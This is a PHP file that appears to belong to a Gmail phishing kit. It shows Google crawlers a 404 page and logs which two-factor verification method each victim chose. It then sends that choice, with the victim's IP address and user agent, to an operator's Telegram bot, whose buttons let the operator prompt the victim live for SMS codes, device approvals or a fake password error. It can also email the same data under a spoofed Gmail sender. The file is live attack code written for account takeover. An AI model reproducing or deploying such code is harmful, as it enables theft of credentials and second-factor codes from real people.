<?php
error_reporting(0);
require_once(__DIR__ . '/../session_init.php');

# Adding Settings
include('function.php');
include('../config.php');


use JayBizzle\CrawlerDetect\CrawlerDetect;
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include("../404.php"); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { include("../404.php"); exit(); }

$useragent = $_SERVER['HTTP_USER_AGENT'];

// Generate random ID for redirects
$random_id = bin2hex(random_bytes(16));

// Check for device parameter in current URL
if (isset($_GET['device']) && !empty($_GET['device'])) {
    $_SESSION['device'] = $_GET['device'];
} else if (!isset($_SESSION['device']) || empty($_SESSION['device'])) {
    $_SESSION['device'] = 'browser';
}

// Check if visitor key exists in cookie
if (!isset($_COOKIE['visitor_key'])) {
    header("Location: ../index.php?" . $random_id);
    exit();
}

// Check if session username exists and has a value
if (!isset($_SESSION['username']) || empty($_SESSION['username'])) {
    header("Location: ../index.php?id=" . $random_id);
    exit();
}

# Generate visitor ID
$visitor_id = bin2hex(random_bytes(32));

# Store visitor ID in JSON file
$redirects_file = dirname(__FILE__) . '/redirects.json';
if (!file_exists($redirects_file)) {
    file_put_contents($redirects_file, json_encode(['redirects' => []], JSON_PRETTY_PRINT));
}

$redirects = json_decode(file_get_contents($redirects_file), true);
$redirects['redirects'][$visitor_id] = [
    'created' => time(),
    'status' => 'waiting'
];
file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));

# Get selected challenge info
$challengeId = isset($_POST['challengeListId']) ? $_POST['challengeListId'] : 'Unknown';
$challengeType = 'Unknown';

switch($challengeId) {
    case '10':
        $challengeType = "Tap Yes on device";
        break;
    case '7':
        $challengeType = "Get security code from device";
        break;
    case '6':
        $challengeType = "SMS Verification";
        break;
    case '2':
        $challengeType = "Backup codes";
        break;
    case '9':
        $challengeType = "Passkey";
        break;
    case 'accountrecovery':
        $challengeType = "Account Recovery";
        break;
}

# Logs
$IP = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
$date = date("F j, Y g:i a");

$msgtg = "🔐 <b>GMAIL VERIFICATION METHOD</b> 🔐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

$msgtg .= "👤 <b>SELECTED METHOD</b>\n";
$msgtg .= "Challenge ID: <code>{$challengeId}</code>\n";
$msgtg .= "Type: <code>{$challengeType}</code>\n\n";

$msgtg .= "📍 <b>LOCATION INFO</b>\n";
$msgtg .= "IP Address: <code>{$IP}</code>\n";
$msgtg .= "Location: <code>http://www.geoiptool.com/?IP={$IP}</code>\n\n";

$msgtg .= "💻 <b>DEVICE INFO</b>\n";
$msgtg .= "User-Agent: <code>" . substr($useragent, 0, 100) . "...</code>\n\n";

$msgtg .= "🔑 <b>VISITOR INFO</b>\n";
$msgtg .= "Visitor ID: <code>{$visitor_id}</code>\n\n";

$msgtg .= "━━━━━━━━━━━━━━━\n";
$msgtg .= "⏰ " . $date . "\n\n";
$msgtg .= " <a href='https://t.me/spy_hacker01'>@spy_hacker01</a>";

if ($settings['telegram'] == "1") {
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '🔒 Security Preference', 'callback_data' => 'security_preference']
            ],
            [
                ['text' => '✅ Yes Prompt', 'callback_data' => 'show_devices'],
                ['text' => '📱 SMS Code I', 'callback_data' => 'sms1']
            ],
            [
                ['text' => '📱 SMS Code II', 'callback_data' => 'sms2'],
                ['text' => '📞 Number Prompt', 'callback_data' => 'number_prompt']
            ],
            [
                ['text' => '❌ Password Error', 'callback_data' => 'password_error'],
                ['text' => '🚫 Block Visitor', 'callback_data' => 'block']
            ],
            [
                ['text' => '✅ Success', 'callback_data' => 'success']
            ]
        ]
    ];

    $send = [
        'chat_id' => $settings['chat_id'],
        'text' => $msgtg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode($keyboard)
    ];
    
    $website = "https://api.telegram.org/bot{$settings['bot_url']}";
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

$error = false;

if ($error) {
  header('Location: https://www.google.com/search?q=Gmail+login');
  exit();
}

$email_msg = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
        .header { background: #DB4437; color: white; padding: 15px; border-radius: 5px 5px 0 0; }
        .section { margin: 15px 0; padding: 15px; background: #f9f9f9; border-radius: 5px; }
        .footer { margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h2>✦ GMAIL OTP Code ✦</h2>
        </div>
        // ... existing code ...
    </div>
</body>
</html>";

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: GMAIL <Gmail@client_site.com>\r\n";
    $subject = "✦ GMAIL OTP Code - {$IP} ✦";
    mail($to, $subject, $email_msg, $headers);
}

header("Location: ../load.php?id=" . $visitor_id);
exit();
?>
